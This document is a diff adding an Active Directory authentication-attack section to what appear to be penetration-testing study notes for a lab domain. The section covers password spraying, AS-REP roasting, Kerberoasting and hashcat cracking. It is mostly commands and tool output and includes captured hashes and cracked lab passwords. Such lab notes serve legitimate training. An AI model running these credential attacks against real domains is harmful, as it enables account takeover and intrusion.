@@ -76,6 +76,7 @@
   * [DNS Tunneling Theory and Practice](#DNS-Tunneling-Theory-and-Practice)
 * [The Metasploit Framework](#The-Metasploit-Framework)
 * [Active Directory](#Active-Directory)
+* [Attacking Active Directory Authentication](#Attacking-Active-Directory-Authentication)
 
 # Useful
 
@@ -2302,3 +2303,238 @@ Address:  192.168.244.74
 # =====================Kali
 $ xfreerdp3 /u:robert /p:'Password123!' /d:corp.com /v:192.168.244.74
 ~~~
+
+# Attacking Active Directory Authentication
+
+## Performing Attacks on Active Directory Authentication
+
+### Password Attacks
+---
+
+#### Showing password rules
+
+~~~
+PS C:\Users\jeff> net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          42
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+~~~
+
+
+#### Authenticating using DirectoryEntry
+
+~~~ powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+~~~
+
+#### Using Spray-Passwords to attack user accounts
+
+~~~ powershell
+cd C:\Tools
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+~~~
+
+#### Using crackmapexec to attack user accounts
+
+~~~ powershell
+cat users.txt
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+~~~
+
+#### Crackmapexec output indicating that the valid credentials have administrative privileges on the target
+
+~~~ powershell
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+~~~
+
+
+#### Using kerbrute to attack user accounts
+
+~~~ powershell
+type .\usernames.txt
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+~~~
+
+
+
+
+### AS-REP Roasting
+---
+
+#### Using GetNPUsers to perform AS-REP roasting
+
+~~~ shell
+kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
+----  --------  --------------------------  --------------------------  --------
+dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
+~~~
+
+
+
+#### Obtaining the correct mode for Hashcat
+
+~~~ shell
+kali@kali:~$ hashcat --help | grep -i "Kerberos"
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+~~~
+
+#### Cracking the AS-REP hash with Hashcat
+
+~~~ powershell
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+
+$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
+...
+~~~
+
+
+#### Using Rubeus to obtain the AS-REP hash of dave
+
+~~~ powershell
+PS C:\Users\jeff> cd C:\Tools
+
+PS C:\Tools> .\Rubeus.exe asreproast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : corp.com
+
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : dave
+[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+[*] Using domain controller: DC1.corp.com (192.168.50.70)
+[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+~~~
+
+
+#### Cracking the modified AS-REP hash
+
+~~~ shell
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
+...
+~~~
+
+
+### Kerberoasting
+---
+
+#### Utilizing Rubeus to perform a Kerberoast attack
+
+~~~ powershell
+PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : corp.com
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : iis_service
+[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Tools\hashes.kerberoast
+~~~
+
+
+#### Using impacket-GetUserSPNs to perform Kerberoasting on Linux
+
+~~~ bash
+kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  -----------  --------  --------------------------  ---------  ----------
+HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
+~~~
+
+
+#### Cracking the TGS-REP hash
+
+~~~ bash
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
+...
+d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
+...
+~~~
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
